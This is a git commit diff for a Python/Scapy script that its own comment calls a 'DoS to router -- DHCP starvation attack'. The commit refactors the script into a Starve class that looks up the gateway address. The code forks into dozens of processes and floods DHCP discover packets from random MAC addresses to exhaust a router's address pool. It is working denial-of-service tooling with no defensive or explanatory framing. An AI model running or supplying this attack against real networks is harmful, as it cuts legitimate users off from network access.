91f1d3292b90a08fc02e9f50cf239527003988ce
juanga333 <juangaruiz19@gmail.com>
2020-12-01 17:40:26 +0100

    m

--- starvation.py
+++ starvation.py
@@ -1,37 +1,45 @@
 import argparse
 import os
 import time
+
+from scapy.config import conf
 from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
+from scapy.layers.l2 import Ether, getmacbyip
 from scapy.sendrecv import sendp
 from scapy.volatile import RandMAC
 
+class Starve:
+    # Real router
+    __GATEWAY_IP: str
+    __GATEWAY_MAC: str
 
-# DoS to router -- DHCP starvation attack
-def starvation(self, delay, iteration):
-    os.fork()
-    os.fork()
-    os.fork()
-    os.fork()
-    os.fork()
-    os.fork()
-    for i in range(iteration):
-        request = self.generatePacketClient("discover", RandMAC())
-        sendp(request)
-        time.sleep(int(delay))
+    def __init__(self):
+        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
 
+    # DoS to router -- DHCP starvation attack
+    def starvationAttack(self, delay, iteration):
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
+        for i in range(iteration):
+            request = self.generatePacketClient("discover", RandMAC())
+            sendp(request)
+            time.sleep(int(delay))
 
-# Return a DHCP a client packet
-def generatePacketClient(self, type, mac):
-    return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-            IP(src="0.0.0.0", dst="255.255.255.255") /
-            UDP(sport=68, dport=67) /
-            BOOTP(chaddr=mac) /
-            DHCP(options=[
-                ('message-type', type),
-                ("server_id", self.__GATEWAY_IP),
-                "end"]))
+    # Return a DHCP a client packet
+    def generatePacketClient(self,type, mac):
+        return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst="255.255.255.255") /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=mac) /
+                DHCP(options=[
+                    ('message-type', type),
+                    ("server_id", self.__GATEWAY_IP),
+                    "end"]))
 
 
 if __name__ == "__main__":
@@ -51,5 +59,6 @@ if __name__ == "__main__":
     else:
         iteration = args.iteration
 
-    starvation(seconds, int(iteration))
+    s = Starve()
+    s.starvationAttack(seconds, int(iteration))
 
